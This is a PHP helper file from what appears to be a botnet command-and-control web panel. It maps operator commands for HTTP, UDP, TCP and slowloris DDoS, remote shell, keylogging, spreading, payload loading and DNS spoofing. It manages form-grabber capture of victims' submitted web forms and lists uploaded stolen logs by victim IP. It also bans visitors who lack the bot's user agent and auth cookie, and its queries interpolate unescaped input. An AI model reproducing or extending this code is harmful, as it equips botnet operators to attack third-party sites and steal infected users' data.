<?php

if (!defined('N3N')) {
    header("HTTP/1.0: 404 Not Found");
    $notfound =
        "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">" .
        "<HTML>" .
        "<HEAD>" .
        "<TITLE>404 Not Found</TITLE>" .
        "</HEAD>" .
        "<BODY>" .
        "<H1>Not Found</H1>" .
        "The requested URL " . htmlspecialchars($_SERVER['REQUEST_URI']) . " was not found on this server." .
        "</BODY>" .
        "</HTML>";
    die($notfound);
}

$adelim = "#";
function ShowFlag($countrycode, $altext = null)
{
    if ($countrycode == "ALL")
        return '<span class="glyphicon glyphicon-globe" title="All country" style="cursor: default;"></span></a>';
    if (strlen($countrycode) < 5)
        return '<img src="data:image/gif;base64,R0lGODlhAQABAIAAAP///wAAACH/C1hNUCBEYXRhWE1QPD94cGFja2V0IGJlZ2luPSLvu78iIGlkPSJXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQiPz4gPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iQWRvYmUgWE1QIENvcmUgNS4wLWMwNjAgNjEuMTM0Nzc3LCAyMDEwLzAyLzEyLTE3OjMyOjAwICAgICAgICAiPiA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPiA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtbG5zOnhtcE1NPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvbW0vIiB4bWxuczpzdFJlZj0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL3NUeXBlL1Jlc291cmNlUmVmIyIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgQ1M1IFdpbmRvd3MiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6NUM4NjA2NjM4OTYxMTFFNEIwMDREN0MzODg1MDNCMUUiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6NUM4NjA2NjQ4OTYxMTFFNEIwMDREN0MzODg1MDNCMUUiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDo1Qzg2MDY2MTg5NjExMUU0QjAwNEQ3QzM4ODUwM0IxRSIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDo1Qzg2MDY2Mjg5NjExMUU0QjAwNEQ3QzM4ODUwM0IxRSIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PgH//v38+/r5+Pf29fTz8vHw7+7t7Ovq6ejn5uXk4+Lh4N/e3dzb2tnY19bV1NPS0dDPzs3My8rJyMfGxcTDwsHAv769vLu6ubi3trW0s7KxsK+urayrqqmop6alpKOioaCfnp2cm5qZmJeWlZSTkpGQj46NjIuKiYiHhoWEg4KBgH9+fXx7enl4d3Z1dHNycXBvbm1sa2ppaGdmZWRjYmFgX15dXFtaWVhXVlVUU1JRUE9OTUxLSklIR0ZFRENCQUA/Pj08Ozo5ODc2NTQzMjEwLy4tLCsqKSgnJiUkIyIhIB8eHRwbGhkYFxYVFBMSERAPDg0MCwoJCAcGBQQDAgEAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==" class="flag flag-' . strtolower($countrycode) . '" alt="' . $altext . '" title="' . $altext . '" >';
    else
        return $countrycode;
}

function ConnectMySQL($host, $login, $password, $database)
{
    $connect = mysql_connect($host, $login, $password);
    if ($connect == false)
        die(
            '<link href="css/bootstrap.css" rel="stylesheet" media="screen">
    <div class="panel panel-danger" style="width: 25%;margin: 0 auto;">
            <div class="panel-heading">
                <h3 class="panel-title">Error!</h3>
            </div>
            <div class="panel-body">
                Can\'t connect to database!
            <br>Error code : ' . mysql_error() . ' </div></div>');

    mysql_set_charset('UTF8', $connect);
    $selectdb = mysql_select_db($database);
    if ($selectdb == false) {
        die(' <link href="css/bootstrap.css" rel="stylesheet" media="screen">
    <div class="panel panel-danger" style="width: 25%;margin: 0 auto;">
            <div class="panel-heading">
                <h3 class="panel-title">Error!</h3>
            </div><div class="panel-body"> Can\'t select database!<br>Error code : ' . mysql_error() . ' </div></div>');
    }
}

function MessageRedirect($link, $text = null)
{
    echo "<script>";
    if (!is_null($text))
        echo 'bootbox.alert("' . $text . '");';
    if (!is_null($link))
        echo "location=\"$link\";";
    echo "</script>";
}

function CmdParser($cmd)
{
    global $adelim;
    $cmd_str = explode($adelim, ($cmd));
    $echo_cmd = $cmd_str[1];
    return $echo_cmd;
}

function NotFound()
{
    header("HTTP/1.0: 404 Not Found");
    $notfound =
        "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">" .
        "<HTML>" .
        "<HEAD>" .
        "<TITLE>404 Not Found</TITLE>" .
        "</HEAD>" .
        "<BODY>" .
        "<H1>Not Found</H1>" .
        "The requested URL " . htmlspecialchars($_SERVER['REQUEST_URI']) . " was not found on this server." .
        "<ADDRESS>" .
        "</ADDRESS>" .
        "</BODY>" .
        "</HTML>";
    echo $notfound;
    die();
}

function CheckBotUserAgent($ip)
{
    $bot_user_agent = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0";
    if ($_SERVER['HTTP_USER_AGENT'] != $bot_user_agent) {
        AddBan($ip);
    }
    if (!isset($_COOKIE['authkeys'])) {
        AddBan($ip);
    }
    $cookie_check = $_COOKIE['authkeys'];
    if ($cookie_check != "21232f297a57a5a743894a0e4a801fc3") {
        AddBan($ip);
    }
}

function CheckGuest($key)
{
    if (isset($_COOKIE['authkey']) || isset($_GET["authkey"])) {
        if (isset($_COOKIE['authkey'])) {
            $authkey = $_COOKIE['authkey'];
            if ($authkey != $key) {
                return false;
            } else {
                return true;
            }
        } elseif (isset($_GET['authkey'])) {
            $authget = $_GET['authkey'];
            if ($authget != $key) {
                return false;
            } else {
                setcookie('authkey', $key);
                $_COOKIE['authkey'] = $key;
                return true;
            }
        }
    }
    return false;
}

function CheckBan($ip)
{
    $q = mysql_query("SELECT * FROM `banned` WHERE `ip` = '$ip' LIMIT 1");
    $get = mysql_num_rows($q);
    if ($get == "1") {
        NotFound();
    }
}

function AddUserBan($ip)
{
    $q = mysql_query("SELECT * FROM banned WHERE `ip` = '$ip' LIMIT 1");
    $get = mysql_num_rows($q);
    if ($get == "0") {
        mysql_query("REPLACE INTO banned (ip, useragent, ref) VALUES ('$ip', 'NULL', 'NULL')");
    }
}

function AddBan($ip)
{
    if (isset($_SERVER['HTTP_REFERER']))
        $ref = $_SERVER['HTTP_REFERER'];
    else
        $ref = "NULL";

    if (isset($_SERVER['HTTP_USER_AGENT']))
        $uagent = $_SERVER['HTTP_USER_AGENT'];
    else
        $uagent = "NULL";


    $q = mysql_query("SELECT * FROM banned WHERE `ip` = '$ip' LIMIT 1");
    $get = mysql_num_rows($q);
    if ($get == "0") {
        mysql_query("REPLACE INTO banned (ip, useragent, ref) VALUES ('$ip', '$uagent', '$ref')");
    }
    NotFound();
}

function UploadFile($dirname)
{
    if (isset($_COOKIE['ip']))
        $ip = $_COOKIE['ip'];
    else
        $ip = $_SERVER['REMOTE_ADDR'];

    $myfile = $_FILES['data']['tmp_name'];
    $name = $ip . "_" . $_FILES['data']['size'] . "_" . $_FILES['data']['name'];
    mkdir($dirname, 0777);

    if ($name != '') {
        pathinfo($name);
        mkdir($dirname, 0777);
        chdir($dirname);
        move_uploaded_file($myfile, $name);
        chmod($name, 0644);
        exit;
    }
}

function isFFEnabled()
{
    $sql = "SELECT enabled FROM formgrabber_enabled";
    $result = mysql_result(mysql_query($sql), 0);
    if ($result == "on")
        return true;
    else return false;
}

function isHostBlocked()
{
    $result = mysql_result(mysql_query("SELECT block FROM formgrabber_host"), 0);
    $hostnames = explode("\r\n", $result);
    $count = count($hostnames);
    $pattern = base64_decode($_POST['host']);
    for ($i = 0; $i < $count; $i++) {
        $key = strstr($hostnames[$i], $pattern);
        if ($key) {
            return true;
        }
    }
    return false;
}

function isFFGrabbing()
{
    $result = mysql_result(mysql_query("SELECT hostnames FROM formgrabber_host"), 0);
    if ($result == "capture_all")
        return true;

    $hostnames = explode(",", $result);
    $count = count($hostnames);

    $pattern = base64_decode($_POST['host']);
    for ($i = 0; $i < $count; $i++) {
        $key = strstr($hostnames[$i], $pattern);
        if ($key) {
            return true;
        }
    }
    return false;
}

function refresh_rate($act, $rate)
{
    $sql = '';
    if ($act == "get") {
        $sql = "SELECT refresh_rate FROM botnet_config LIMIT 1";
        $refresh_rate = intval(mysql_result(mysql_query($sql), 0));
        return $refresh_rate;
    }

    if ($act == "get_cc") {
        $sql = "SELECT * FROM botnet_config";
        $res = mysql_query($sql);
        if ($res) {
            $row = mysql_fetch_assoc($res);
            if ($row) {
                global $set_rate;
                global $adelim;
                return $row['refresh_id'] . $adelim . $set_rate . " " . $row['refresh_rate'] . $adelim;
            }
        }
    } else if ($act == "set" && !is_null($rate)) {
        $refresh_id = time() . rand(111111, 999999);
        if ($rate > 0 && $rate < 999) {
            $sql = "UPDATE botnet_config SET  refresh_id='$refresh_id', refresh_rate = '$rate'";
            MessageRedirect("?act=settings");
        }
        mysql_query($sql);
    }
    return 1;
}

function EncodeCommand($command)
{
    switch (strtolower($command)) {
        case "http ddos":
            return "http";
            break;
        case "https ddos":
            return "https";
            break;
        case "slowloris ddos":
            return "slow";
            break;
        case "smart http ddos":
            return "smart";
            break;
        case "download flood":
            return "dwflood";
            break;
        case "udp ddos":
            return "udp";
            break;
        case "tcp ddos":
            return "tcp";
            break;
        case "find file":
            return "findfile";
            break;
        case "cmd shell":
            return "cmd";
            break;
        case "keylogger":
            return "keylogger";
            break;
        case "spreading":
            return "spread";
            break;
        case "update":
            return "update";
            break;
        case "loader":
            return "loader";
            break;
        case "visit url":
            return "visit";
            break;
        case "bot killer":
            return "botkiller";
            break;
        case "infection":
            return "infect";
            break;
        case "dns spoofing":
            return "dns";
            break;
    }
    return "failed";
}

function GetSmallStat($bots_online, $bots_offline, $bots_hour, $bots_day, $bots_total, $bots_banned)
{
    $banned_ip = null;
    $sql = "SELECT * FROM banned";
    $res = mysql_query($sql);
    if ($res) {
        $rows = mysql_num_rows($res);
        if ($rows != 0) {
            for ($i = 0; $i < $rows; $i++) {
                $row = mysql_fetch_assoc($res);
                $banned_ip .= "<b>[" . $i . "]</b> " . $row['ip'] . " <b>|</b> " . $row['useragent'] . " <b>|</b> " . $row['ref'] . '\n';
            }
        }
    }

    echo '<div style="text-align:center; width:100%"><ul class="breadcrumb">' .
        ' Online bots :  <span class="badge">' . $bots_online . '</span>' .
        ' Offline bots : <span class="badge">' . $bots_offline . '</span>' .
        ' Hour bots : <span class="badge">' . $bots_hour . '</span>' .
        ' Today bots : <span class="badge">' . $bots_day . '</span>' .
        ' Total bots : <span class="badge">' . $bots_total . '</span>';
    echo "<a href=\"?act=settings&do=blacklist\"\"> Banned ip : <span class=\"badge badge-important\"> $bots_banned </span></a>" .
        "</ul></div><br>";
}

function DeleteAll($dirname)
{
    if ($handle = opendir($dirname)) {
        while (false !== ($file = readdir($handle))) {
            $filename = $dirname . '/' . $file;
            if (file_exists($filename)) {
                if ($file != '.' && $file != '..' && $file != 'index.html' && $file != '.htaccess') {
                    unlink($filename);
                }
            }
        }
        closedir($handle);
    }
}

function get_ip($str)
{
    $pattern = '#[\d]{1,3}\.[\d]{1,3}\.[\d]{1,3}\.[\d]{1,3}#';
    $b = preg_match_all($pattern, $str, $rows);

    if ($b) {
        foreach ($rows[0] as $row) {
            return $row;
        }
    }
    return "failed";
}

function GetFiles($dirname, $logs_files)
{
    if (!empty($_POST['search'])) {
        if (strlen($_POST['search']) < 3) {
            unset($_POST['search']);
            echo "<center><p class='text-warning'><span class='label label-warning'><span class='glyphicon glyphicon-exclamation-sign'></span> Word must consist of at least 3 characters!</span></p></center>";
            return;
        }
    }

    $dir = opendir($dirname);

    while ($file = readdir($dir)) {
        if ($file != '.' && $file != '..' && $file != 'index.html' && $file != '.htaccess') {

            if (!empty($_POST['search'])) {
                if ($moi_file = stristr($file, $_POST['search'])) {
                    $arr_files[] = iconv("windows-1251", "UTF-8", $file);
                    $arr_sizes[] = filesize($dirname . '/' . $file);
                    $arr_datetime[] = date('Y-m-d H:i:s', filemtime($dirname . '/' . $file));
                }
            } else {
                $arr_files[] = iconv("windows-1251", "UTF-8", $file);
                $arr_sizes[] = filesize($dirname . '/' . $file);
                $arr_datetime[] = date('Y-m-d H:i:s', filemtime($dirname . '/' . $file));
            }
        }
    }
    if (empty($_POST['search']))
        $COUNT_FILES_ON_PAGE = 40;
    else
        $COUNT_FILES_ON_PAGE = 1000;

    $COUNT_FILES = count($arr_files);
    $COUNT_PAGES = intval($COUNT_FILES / $COUNT_FILES_ON_PAGE);

    if (empty($_GET['page']) || $_GET['page'] < 0 || $_GET['page'] > $COUNT_PAGES || !intval($_GET['page']))
        $_GET['page'] = 0;

    $START = $_GET['page'] * $COUNT_FILES_ON_PAGE;
    $END = $START + $COUNT_FILES_ON_PAGE;

    if (!array_multisort($arr_datetime, SORT_DESC, $arr_sizes, $arr_files)) {
        ?>
        <div class="panel panel-warning" style="width: 25%;margin: 0 auto;">
            <div class="panel-heading">
                <h3 class="panel-title">Warning</h3>
            </div>
            <div class="panel-body">
                No <?php echo $dirname; ?> in directory!
            </div>
        </div>
    <?php
    } else {
        ?>


        <form method="POST" action="" class="form-search">

            <div class="form-group">
                <div class="input-group">
                    <span class="input-group-addon">Filename : </span>
                    <input type="text" name="search" class="form-control search-query">
    <span class="input-group-btn">
         <button type="submit" name="findit" class="btn btn-default">Search</button>
    </span>
                </div>
            </div>
            <?php
            GetPagination(intval($_GET['page']), "act=" . $dirname . "&", $COUNT_PAGES);
            ?>
        </form>


        <br>
        <?php
        global $options;
        $gi = geoip_open("GeoIP/GeoIP.dat", GEOIP_STANDARD);

        echo "<center>" .
            "<table class=\"table table-condensed table-hover\" style=\"text-align: center; width: auto;\" align=\"center\">" .
            "<tr class=\"active\">" .

            "<th style='text-align: center' width=\"5%\"> # </th>" .
            "<th style='text-align: center' width=\"5%\"> Country </th>" .
            "<th style='text-align: center' width=\"10%\"> IP adrress </th>" .
            "<th width=\"50%\"> ( $COUNT_FILES ) Filename</th>" .
            "<th width=\"15%\"> Date </th>" .
            "<th width=\"10%\"> Size </th>" .
            "<th width=\"5%\"> Action </th>" .
            "</tr><tbody>";
        for ($w = $START; $w < $END; $w++) {

            $bot_cn = geoip_country_code_by_addr($gi, get_ip($arr_files[$w]));
            if ($bot_cn == null) {
                $bot_cn = "O1";
            }
            if (array_key_exists($w, $arr_files)) {

                if ($arr_sizes[$w] >= 1024)
                    $fsstr = sprintf('%1.2f', $arr_sizes[$w] / 1024) . ' KB';
                else
                    $fsstr = $arr_sizes[$w] . ' B';
                echo '<tr class="active">' .
                    '<td width="5%">' . $w . '</td>' .
                    '<td style="text-align: center" align="center" id="id_size" width="5%">' . ShowFlag($bot_cn, $options[$bot_cn]) . '</td>' .
                    '<td style="text-align: center" width="5%">' . get_ip($arr_files[$w]) . '</td>' .
                    '<td width="55%" style="text-align: left"><a href="' . $dirname . '/' . $arr_files[$w] . '">' . $arr_files[$w] . '</a></td>' .
                    '<td width="15%" style="text-align: left">' . $arr_datetime[$w] . '</td>' .
                    '<td width="10%" style="text-align: left">' . $fsstr . '</td>' .
                    '<td width="5%"><a href="' . $dirname . '/' . $arr_files[$w] . '" title = "Download"><span class="glyphicon glyphicon-save"></span></a>' .
                    ' <a href="' . $_SERVER['PHP_SELF'] . '?act=' . $dirname . '&delete=' . $arr_files[$w] . '" title = "Delete"><span class="glyphicon glyphicon-trash"></span></span></i></a></td></tr>';
            }
        }
        echo '</tbody></table></center>';
        geoip_close($gi);
        closedir($dir);
        GetPagination(intval($_GET['page']), "act=" . $dirname . "&", $COUNT_PAGES);
        echo "<div align='right'><a class=\"btn btn-sm btn-danger\" href = \"#\" onclick=ConfirmDelete(\"" . $_SERVER['PHP_SELF'] . "?act=" . $dirname . "&deleteall=1\");> Delete all </a></div> <br>";

        if (!empty($_GET['delete'])) {
            $file = iconv('utf-8', 'cp1251', $dirname . '/' . $_GET['delete']);
            if (unlink($file))
                MessageRedirect($logs_files);
            else
                MessageRedirect($logs_files);
        }

        if (!empty($_GET['deleteall'])) {
            DeleteAll($dirname);
            MessageRedirect($logs_files);
        }

    }
}

function GetPagination($page, $str, $count_pages)
{
    if ($count_pages == 0)
        return;

    echo "<div style=\"text-align: center\"> <ul class=\"pagination pagination-sm\">";
    if ($page > 0) $pervpage = "<li><a href= ./?" . $str . "page=0><<</a></li>
                               <li><a href= ./?" . $str . "page=" . ($page - 1) . "><</a></li>";

    if ($page != $count_pages) $nextpage = "<li><a href= ./?" . $str . "page=" . ($page + 1) . ">></a></li>
                                   <li><a href= ./?" . $str . "page=" . $count_pages . ">>></a></li>";

    if ($page - 2 > 0)
        $page2left = " <li ><a href= ./?" . $str . "page=" . ($page - 2) . ">" . ($page - 2) . "</a></li>  ";
    if ($page - 1 > 0)
        $page1left = " <li ><a href= ./?" . $str . "page=" . ($page - 1) . ">" . ($page - 1) . "</a></li> ";
    if ($page + 2 <= $count_pages)
        $page2right = "  <li><a href= ./?" . $str . "page=" . ($page + 2) . ">" . ($page + 2) . "</a></li>";
    if ($page + 1 <= $count_pages)
        $page1right = "  <li ><a href= ./?" . $str . "page=" . ($page + 1) . ">" . ($page + 1) . "</li></a>";
    echo $pervpage . $page2left . $page1left . "<li class=\"active\"><a>" . $page . "</a></li>" . $page1right . $page2right . $nextpage;

    echo "</ul></div>";

}

function strip_data($text)
{
    if (!is_array($text)) {
        return $text;
    }

    return "_SQL_";
}

function my_substr($text)
{
    if (strlen($text) > 30) {
        $string = substr($text, 0, 30);
        $string .= '...';
        return $string;
    }
    return $text;
}

function strs($string, $symbol)
{
    $buffer = stristr($string, $symbol);
    if ($buffer == false)
        return "";

    $pos = strpos($buffer, "\r\n");
    return substr($buffer, 0, $pos) . PHP_EOL;
}